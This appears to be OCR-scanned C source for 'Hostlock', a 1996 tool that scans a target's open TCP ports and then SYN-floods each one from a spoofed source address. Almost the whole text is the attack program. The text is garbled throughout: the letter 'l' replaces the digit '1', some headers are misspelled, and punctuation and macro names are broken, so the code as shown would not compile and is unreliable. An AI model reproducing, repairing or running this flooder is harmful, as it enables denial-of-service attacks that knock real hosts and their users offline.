/* !!THIS PROGRAM IS EXTREMELY DANGEROUS!!  NO GUIDELINES
 * ARE PROVIDED FOR THE CODE CONTAINED HEREIN.  IT IS MERELY
 * A DEMONSTRATION OF THE POSSIBLE DESTRUCTIVE USE OF IP
 * SPOOFING TECHNIQUES.  THE AUTHOR CLAIMS NO RESPONSIBILITY
 * FOR ITS USE OR MISUSE.  - JF (3/8/96)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/types.h>
#include <svs/socket.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/protocols.h>

#include <arpa/inet.h>
#include <netdb.h>

#define PACKET_SIZE sizeof(struct tcppkt)

/* Configurable defaults. These are specifiable via the command line. */
#define  DEF_BADDF   "l32.45.6.8"
#define  DEF_SYNS    32
#define  DEF_MAX     32768                /* (See Accompanying Table) */
#define  DEF_LOW

struct tcppkt {
  struct iphdr ip;
  struct tcphdr tcp;
};

u short ports[DEF_MAX];

void
usage(progname)
  char *progname;
{
  fprintf(stderr, "Hostlock v.0l\n");
  fprintf(stderr, "Usage: %s <Target> [options]\n", progname);
  fprintf(stderr, "Options:\n\
-b [addr]\tAddress from which the SYNflood packets should appear to be.\n\
\t\tThis address should have correct routing records, but not exlst.\n\
-l [port]\tPort to begin scanning from.\n\
-h [port]\tPort to end scanning on.\n\
-d [port]\tSpecific port to flood.\n\
-n [syns]\tNumber of SYN packets to flood with.\n");

  exit(l);
}

u_long
resolve(host)
  char *host;
{
  struct hostent *he;
  u_long addr;

  if( (he = gethostbyname(host)) == NULL)  {
      addr = inet_addr(host);
  } else {
    bcopy(*(he->h_addr_list), &(addr), sizeof(he->h_addr_list));
  }

   return(addr);
}

/* From ping.c */
/*
 *in cksum -
 * Checksum routine for Internet Protocol family headers (C Version)
 */
unsigned short in_cksum(addr, len)
    u_short *addr
    int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > l)  {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == l) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }

    sum = (sum >> l6) + (sum & 0xffff);
    sum += (sum >> l6);
    answer = -sum;

    return(answer);
}

int
sendsyn(sin, s, saddr, sport, seq)
  struct  sockaddr_in *sin;
  u_long  saddr, seq;
  u_short sport;
  int     s;
{
  register struct  iphdr *ip;
  register struct  tcphdr *tcp;
  register char    *php;
  static   char    packet[PACKET_SIZE];
  static   char    phead[PACKET_SIZE + l2];
  u_short len      = 0;

  /* Overlay IP header structure onto packet. */
  ip           = (struct iphdr *)packet;

  /* Fill in IP Header values. */
  ip->ihl      = 5;
  ip->version  = 4;
  ip->tos      = 0;
  ip->tot_len  = htons(PACKET_SIZE)
  ip->id       = htons(2600 + (rand()%32768));
  ip->frag_off = 0;
  ip->ttl      = 255;
  ip->protocol = IPPROTO_TCP;
  ip->check    = 0;
  ip->saddr    = saddr;
  ip->daddr    = sin->sin_addr.s_addr;

/*  The Linux kernel automatically checksums outgoing raw packets.
 *  however, other implementations might not, so if you are porting,
 *  remember to uncomment this line.
 *  ip->check    = in_cksum((char *)&ip, sizeof(struct iphdr));
 */

  /* Overlay TCP Header structure onto packet. */
  tcp          = (struct tcphdr *)(packet + sizeof(struct iphdr));

  /* Fill in TCP Header values. */
  tcp->th_sport = htons (sport);
  tcp->th_dport = htons (sin->sin_port);
  tcp->th_seq   = htonl(seq);
  tcp->th_ack   = 0;
  tcp->th_x2    = 0;
  tcp->th_off   = 5;
  tcp->th_flags = TH_SYN;
  tcp->th_win   = htons(l0052);
  tcp->th_sum   = 0;
  tcp->th_urp   = 0;

  php = phead;
  memset(php, 0, PACKET_SIZE + l2);
  memcpy(php, &(ip->saddr), 8);

  php += 9;
  memcpy(php, &(ip->protocol), l);

  len = htons(sizeof(struct tcphdr));
  memcpy(++php, &(len), 2);

  php += 2;
  memcpy(php, tcp. sizeof(struct tcphdr));

  /* Now fill in the checksum. */

  tcp->th_sum = in_cksum(php, sizeof(struct tcphdr)+l2);

  /* And send... */
  return(sendto(s, packet, PACKET_SIZE, 0, (struct sockaddr *)sin,
         sizeof(struct sockaddr_in)));
}



int

synscan(saddr, sport, lo, hi, s, r, sin)
  u_long  saddr;
  u_short sport, lo, hi;
  int     s, r;
  struct  sockaddr_in *sin;
{
  struct  tcppkt buf;
  int     i, total = 0;

  for(i = lo ; i <= hi ; i++) {
    sin->sin_port = i;
    if( (sendsyn(sin, s, saddr, sport, 3l337)) == -l) {
      perror("Error sending SYN packet");
      exit(l);
    }

    for(;;) {
      memset(&buf, 0, PACKET_SIZE);
      read(r, &buf, PACKET_SIZE);
      /* Is it from our target? */
      if( buf.ip.saddr != sin->sin_addr.s_addr ) continue;

      /* Sequence number ok? */
      if( (ntohl(buf.tcp.th_ack) != 3l338) &&
          (ntohl(buf.tcp.th_ack) != 3l337)) continue;

      /* RST/ACK - No service listening on port. */
      if( (buf.tcp.th_flags & TH_RST) &&
          (buf.tcp.th flags & TH_ACK)) break;

      /* SYN/ACK - Service listening on port. */
      if( (buf.tcp.th_flags & TH_ACK) &&
          (buf.tcp.th_flags & TH_SYN)) {

      ports[total] = ntohs(buf.tcp.th_sport);
      printf("%d\n", ports[total++]);
      fflush(stdout);
      break;
      }
    } /* for(;;) */
  }

  return(total);
}

void
synflood(baddr, bport, s. numsyns, sin)
  u_long  baddr;
  u_short bport, numsyns;
  int     s;
  struct  sockaddr_in *sin;
{
  int i;

  printf("%d", sin->sin_port);
  fflush(stdout);

  for(i = 0 ; i < numsyns ; i++) {
    usleep(30);

    if( (sendsyn(sin, s. baddr, bport++, 3l337)) == -l) {
        perror("Error sending SYN packet");
        exit(l);
    }

    printf(",");
    fflush(stdout);
  }

  printf("\n");
}

void
main(argc, argv)
  int    argv;
  char **argv;
{
  struct  sockaddr_in sin;
  u_long  saddr, daddr, baddr;
  u_short i, numsyns, lo, hi;
  u_short sport = 2600, bport = 2600;
  char    buf[256];
  int     s, r, total;

  total = numsyns = lo = hi = baddr = 0;

  /* Minimum usage is "hostlock <target>" */
  if(argc < 2) usage(argv[0]);

  if( (daddr = resolve(argv[l])) == -l) {
    fprintf(stderr, "Bad hostname/ip address: %s\n", argv[l]);
    usage(argv[0]);
  }



  for(i = 2 ; i < argc ; i ++) {
    switch(argv[i][l]) {
      case 'b': case 'B':
        if( (baddr = inet_addr(argv[++i])) == -l) {
          fprintf(stderr, "Bad hostname/ip address: %s\n", argv[l]);
          fprintf(stderr, "Defaulting to %s...\n", (DEF_BADDR);
          baddr    = inet_addr(DEF_BADDR);
        }
        break;
      case 'l': case 'L':
        lo = atoi(argv[++i]);
        break;
      case 'h': case 'H':
        hi = atoi(argv[++i]);
        break;
      case 'd': case 'D':
        hi = lo = atoi(argv[++i]);
        break;
      case 'n': case 'N':
        numsyns = atoi(argv[++i]);
        break;
      default:
        fprintf(stderr, "Unknown option: -%c\n", argv[i][l]);
        usage(argv[0]);
        break;
    }
  }

  /* Institute defaults if these options have not been specified. */
  if(!numsyns) numsyns = DEF_SYNS;
  if(!lo)      lo      = DEF_LOW;
  if(!hi)      hi      = DEF MAX;
  if(!baddr)   baddr   = inet_addr(DEF_BADDR);

  /* Fill in our sockaddr_in structure. */
  sin.sin_family       = PF_INET;
  sin.sin addr.s_addr  = daddr;
  sin.sin port         = 0;

  if( (gethostname(buf. 256)) == -l) {
    perror("Unable to get our hostname");
    exit(l);
  }

  if( (saddr = resolve(buf)) == -l) {
    perror("Unable to resolve our hostname");
    exit(l);
  }

  /* Open our sending and receiving sockets. */
  if( (s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("Unable to open a raw socket");
    exit(l);
  }

  if( (r = socket(PF_INET, SOCK RAW, IPPROTO_TCP)) < 0) {
    perror("Unable to open a raw socket");
    exit(l);
  }

  printf("Performing hostlock on %s ports %d to %d. \n",
    inet_ntoa(sin.sin_addr), lo, hi);

  /* Scan. */
  printf("Scanning...\n");
  fflush(stdout);
  total = synscan(saddr, sport, lo. hi, s, r, &sin);

  printf("Scan completed.  %d receiving ports found.\n", total);
  sleep(2);                 /* Pause to let everything clear out. */

  printf("Flooding ports with %d SYNs each...\n", numsyns);
  fflush(stdout);

  /* Flood. */
  if( total ) {
    for(i = 0 ; i < total ; i++) {
      sin.sin port = ports[i];
      synflood(baddr, bport, s, numsyns, &sin);
    }
  }

  printf("Hostlock completed.  Exiting.\n");

  exit(0);
}


